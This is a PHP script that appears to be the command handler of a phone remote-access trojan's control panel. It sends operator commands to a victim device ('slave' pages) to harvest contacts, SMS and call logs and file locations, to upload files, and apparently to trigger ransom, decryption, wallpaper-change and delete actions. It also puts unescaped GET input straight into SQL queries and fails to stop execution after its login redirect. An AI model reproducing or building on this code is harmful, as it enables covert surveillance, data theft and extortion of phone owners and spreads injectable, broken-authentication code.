<?php
	include_once 'sql.php';
session_start();
session_regenerate_id();
if(!isset($_SESSION['user']))      // if there is no valid session
{
    header("Location: ../login.html");
}
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
} 
if( $_GET["id"] || $_GET["command"] || $_GET["injection"] || $_GET["noti"] )
$hek = $_GET["id"];
$command = $_GET["command"];
$path = $_GET["injection"];
$wal = $_GET["noti"];

{
    $sql = "UPDATE hack SET command = '$command' WHERE `id` = '$hek'";
}

if ($conn->query($sql) === TRUE) {
} else {
}

{
    $sql = "UPDATE text SET text = '$path'";
}

if ($conn->query($sql) === TRUE) {
} else {
}

{
    $sql = "UPDATE noti SET text = '$wal'";
}

if ($conn->query($sql) === TRUE) {
} else {
}
if ($command === "con"){
$sql = "truncate table getContactList";   
$result = mysqli_query($conn, $sql);
header ('Location:slavcon.php');
} elseif ($command === "smlg"){
$sql = "truncate table smslog";   
$result = mysqli_query($conn, $sql);
header ('Location:slavesms.php');
} elseif ($command === "cllg"){
$sql = "truncate table calllogs";
$result = mysqli_query($conn, $sql);
header ('Location:cllg.php');
} elseif ($command === "infe"){
$sql = "truncate table filepath";   
$result = mysqli_query($conn, $sql);
header ('Location:getfileloc.php');
} elseif ($command === "sdfe"){
$sql = "truncate table filepath";   
$result = mysqli_query($conn, $sql);
header ('Location:getfileloc.php');
} elseif ($command === "upld"){
header ('Location:hell.php');
} elseif ($command === "rnsm" || $command === "dery" ||  $command === "chwl" || $command === "del" || $command === "nofi" ){
header ('Location:index.php?rc=command%20send%20successfully');
}
$conn->close();

?>